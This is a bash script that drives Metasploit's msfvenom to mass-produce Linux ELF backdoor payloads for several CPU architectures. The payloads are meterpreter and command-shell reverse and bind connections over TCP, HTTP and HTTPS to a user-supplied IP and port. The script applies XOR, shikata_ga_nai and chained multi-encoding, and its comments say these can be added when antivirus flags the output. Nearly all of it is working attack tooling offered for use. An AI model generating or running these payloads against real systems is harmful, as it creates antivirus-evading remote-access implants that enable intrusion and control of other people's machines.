clear 
echo "*********************************************************"
echo " Automatic METTLE loader generator  - FOR METASPLOIT     "
echo " For  Linux x86_64  - STATIC BINARY                      " 
echo " aarch64/armle/mipsbe/mipsle/x64/x86                     "   
echo " Fork() exercise using custom mettle loader              " 
echo " Astr0Baby                                               " 
echo "*********************************************************"
echo -e "What IP are we gonna use ? \c"
read IP 
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo '[*] Checking if metasploit msfconsole and  msfvenom are present in current path ..'
if [ -x ./msfvenom ]; then
echo '[*] Found msfvenom in current path ........ good'

MSFVERSION=`./msfconsole --version` 
echo -n $MSFVERSION
else
echo '[-] No msfvenom in path...make sure you have this script in your metasploit-framework path'
exit 0
fi 

#  TESTED WITH GCC 6.5.0 (x64)   
#  TESTED WITH GCC 7.3.0 (x64) 
#  TESTED WITH GCC 8.2.0 (x64) 
#  TESTED WITH GCC 8.2.0 (aarch64)

echo '[*] Checking if GCC compiler is present..'
if [ -x /usr/bin/gcc ]; then
echo '[*] Found gcc ' 
GCCVERSION=`gcc --version | head -n 1`
echo  $GCCVERSION

else
echo '[-] No working gcc found ...make sure you have GCC compiler installed '
exit 0
fi

mkdir -p AVCHECK

################################################################################################################
# Encoder variables 

#  x86_64 

# x64/xor                                        normal     No     XOR Encoder
# x64/xor_dynamic                                normal     No     Dynamic key XOR Encoder
# x64/zutto_dekiru                               manual     No     Zutto Dekiru

#   x86 

# x86/add_sub                                    manual     No     Add/Sub Encoder
# x86/alpha_mixed                                low        No     Alpha2 Alphanumeric Mixedcase Encoder
# x86/alpha_upper                                low        No     Alpha2 Alphanumeric Uppercase Encoder
# x86/avoid_underscore_tolower                   manual     No     Avoid underscore/tolower
# x86/avoid_utf8_tolower                         manual     No     Avoid UTF8/tolower
# x86/bloxor                                     manual     No     BloXor - A Metamorphic Block Based XOR Encoder
# x86/bmp_polyglot                               manual     No     BMP Polyglot
# x86/call4_dword_xor                            normal     No     Call+4 Dword XOR Encoder
# x86/context_cpuid                              manual     No     CPUID-based Context Keyed Payload Encoder
# x86/context_stat                               manual     No     stat(2)-based Context Keyed Payload Encoder
# x86/context_time                               manual     No     time(2)-based Context Keyed Payload Encoder
# x86/countdown                                  normal     No     Single-byte XOR Countdown Encoder
# x86/fnstenv_mov                                normal     No     Variable-length Fnstenv/mov Dword XOR Encoder
# x86/jmp_call_additive                          normal     No     Jump/Call XOR Additive Feedback Encoder
# x86/nonalpha                                   low        No     Non-Alpha Encoder
# x86/nonupper                                   low        No     Non-Upper Encoder
# x86/opt_sub                                    manual     No     Sub Encoder (optimised)
# x86/service                                    manual     No     Register Service
# x86/shikata_ga_nai                             excellent  No     Polymorphic XOR Additive Feedback Encoder
# x86/single_static_bit                          manual     No     Single Static Bit
# x86/unicode_mixed                              manual     No     Alpha2 Alphanumeric Unicode Mixedcase Encoder
# x86/unicode_upper                              manual     No     Alpha2 Alphanumeric Unicode Uppercase Encoder
# x86/xor_dynamic                                normal     No     Dynamic key XOR Encoder

# Main encoder variables are set here
# Add iterations to suite your needs 

encoder64="x64/xor"
encoder32="x86/shikata_ga_nai -i 5"
encoder32_1="x86/bloxor -i 4"

###################################################################################################################


# Main msfvenom shellcode call here 
# x86_64 stuff here
./msfvenom -p linux/x64/meterpreter/reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-mt-reverse_tcp-xor.elf 
./msfvenom -p linux/x64/meterpreter/reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux  -f elf -o AVCHECK/x64-mt-reverse_tcp.elf
./msfvenom -p linux/x64/meterpreter_reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-mt-reverse_tcp-xor2.elf
./msfvenom -p linux/x64/meterpreter_reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux  -f elf -o AVCHECK/x64-mt-reverse_tcp2.elf
./msfvenom -p  linux/x64/exec  CMD=id -a x64 --platform linux  -e $64xor -f elf -o AVCHECK/x64-exec-xor.elf                                                        
./msfvenom -p  linux/x64/exec  CMD=id -a x64 --platform linux  -f elf -o AVCHECK/x64-exec.elf
./msfvenom -p  linux/x64/meterpreter/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-mt-bind_tcp-xor.elf                                       
./msfvenom -p  linux/x64/meterpreter/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -f elf -o AVCHECK/x64-mt-bind_tcp.elf
./msfvenom -p  linux/x64/meterpreter_reverse_http EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-mt-rev-http-xor.elf                                   
./msfvenom -p  linux/x64/meterpreter_reverse_http EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x64 --platform linux  -f elf -o AVCHECK/x64-mt-rev-http.elf
./msfvenom -p  linux/x64/meterpreter_reverse_https EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x64 --platform linux -e $encoder64 -f elf -o AVCHECK/x64-mt-rev-https-xor.elf                                
./msfvenom -p  linux/x64/meterpreter_reverse_https EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x64 --platform linux -f elf -o AVCHECK/x64-mt-rev-https.elf
./msfvenom -p  linux/x64/shell/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-sh-bind_tcp-xor.elf                                         
./msfvenom -p  linux/x64/shell/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -f elf -o AVCHECK/x64-sh-bind_tcp.elf
./msfvenom -p  linux/x64/shell/reverse_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-sh-reverse-xor.elf                                    
./msfvenom -p  linux/x64/shell/reverse_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -f elf -o AVCHECK/x64-sh-reverse.elf
./msfvenom -p  linux/x64/shell_bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-sh-bind_tcp-xor2.elf                                     
./msfvenom -p  linux/x64/shell_bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x64 --platform linux  -f elf -o AVCHECK/x64-sh-bind_tcp2.elf
./msfvenom -p  linux/x64/shell_reverse_tcp  EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux  -e $encoder64 -f elf -o AVCHECK/x64-sh-reverse_tcp-xor2.elf                              
./msfvenom -p  linux/x64/shell_reverse_tcp  EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux  -f elf -o AVCHECK/x64-sh-reverse_tcp2.elf
# Not doing the ones below - feel free to experiment 
#./msfvenom -p  linux/x64/shell_bind_ipv6_tcp
#./msfvenom -p  linux/x64/shell_bind_tcp_random_port
#./msfvenom -p  linux/x64/shell_find_port                            
#./msfvenom -p  linux/x64/shell_reverse_ipv6_tcp

# x86 stuff here 

./msfvenom -p linux/x86/meterpreter/reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-mt-reverse_tcp-xor.elf
./msfvenom -p linux/x86/meterpreter/reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x86 --platform linux  -f elf -o AVCHECK/x86-mt-reverse_tcp.elf
./msfvenom -p linux/x86/meterpreter_reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-mt-reverse_tcp-xor2.elf
./msfvenom -p linux/x86/meterpreter_reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x86 --platform linux  -f elf -o AVCHECK/x86-mt-reverse_tcp2.elf
./msfvenom -p linux/x86/exec  CMD=id -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-exec-xor.elf     
./msfvenom -p linux/x86/exec  CMD=id -a x86 --platform linux  -f elf -o AVCHECK/x86-exec.elf
./msfvenom -p linux/x86/meterpreter/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-mt-bind_tcp-xor.elf
./msfvenom -p linux/x86/meterpreter/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -f elf -o AVCHECK/x86-mt-bind_tcp.elf
./msfvenom -p linux/x86/meterpreter_reverse_http EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-mt-rev-http-xor.elf         
./msfvenom -p linux/x86/meterpreter_reverse_http EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x86 --platform linux  -f elf -o AVCHECK/x86-mt-rev-http.elf
./msfvenom -p linux/x86/meterpreter_reverse_https EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x86 --platform linux -e $encoder32 -f elf -o AVCHECK/x86-mt-rev-https-xor.elf 
./msfvenom -p linux/x86/meterpreter_reverse_https EXITFUNC=process LHOST=$IP LPORT=$port  LURI=/ -a x86 --platform linux -f elf -o AVCHECK/x86-mt-rev-https.elf
./msfvenom -p linux/x86/shell/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-sh-bind_tcp-xor.elf
./msfvenom -p linux/x86/shell/bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -f elf -o AVCHECK/x86-sh-bind_tcp.elf
./msfvenom -p linux/x86/shell/reverse_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-sh-reverse-xor.elf 
./msfvenom -p linux/x86/shell/reverse_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -f elf -o AVCHECK/x86-sh-reverse.elf
./msfvenom -p linux/x86/shell_bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-sh-bind_tcp-xor2.elf
./msfvenom -p linux/x86/shell_bind_tcp EXITFUNC=process  RHOST=$IP LPORT=$port -a x86 --platform linux  -f elf -o AVCHECK/x86-sh-bind_tcp2.elf
./msfvenom -p linux/x86/shell_reverse_tcp  EXITFUNC=process LHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f elf -o AVCHECK/x86-sh-reverse_tcp-xor2.elf
./msfvenom -p linux/x86/shell_reverse_tcp  EXITFUNC=process LHOST=$IP LPORT=$port -a x86 --platform linux  -f elf -o AVCHECK/x86-sh-reverse_tcp2.elf

# Multiple encoder idea only really valid for x86 architecture
# You can add above x86 payloads if the above get flagged by the AV 

./msfvenom -p linux/x86/meterpreter/reverse_tcp EXITFUNC=process LHOST=$IP LPORT=$port -a x86 --platform linux  -e $encoder32 -f raw | ./msfvenom  -a x86 --platform linux  -e $encoder32_1 -f elf -o AVCHECK/x86-mt-reverse_tcp-xor.elf.multi 


# Other architectures here 
./msfvenom -p linux/aarch64/meterpreter/reverse_tcp  EXITFUNC=process LHOST=$IP LPORT=$port -a aarch64 --platform linux -f elf -o AVCHECK/aarch64-reverse_tcp.elf  
./msfvenom -p linux/aarch64/meterpreter_reverse_tcp  EXITFUNC=process LHOST=$IP LPORT=$port -a aarch64 --platform linux -f elf -o AVCHECK/aarch64-reverse_tcp2.elf
./msfvenom -p linux/armle/meterpreter_reverse_tcp    EXITFUNC=process LHOST=$IP LPORT=$port -a armle --platform linux   -f elf -o AVCHECK/armle-reverse_tcp2.elf
./msfvenom -p linux/mipsbe/meterpreter/reverse_tcp   EXITFUNC=process LHOST=$IP LPORT=$port -a mipsbe --platform linux  -e mipsbe/longxor -f elf -o AVCHECK/mipsbe-reverse_tcp.elf                     
./msfvenom -p linux/mipsle/meterpreter/reverse_tcp   EXITFUNC=process LHOST=$IP LPORT=$port -a mipsle --platform linux  -e mipsle/longxor -f elf -o AVCHECK/mipsle-reverse_tcp.elf                   

# Finish
echo '[*] Done !' 
ls -la AVCHECK/* 
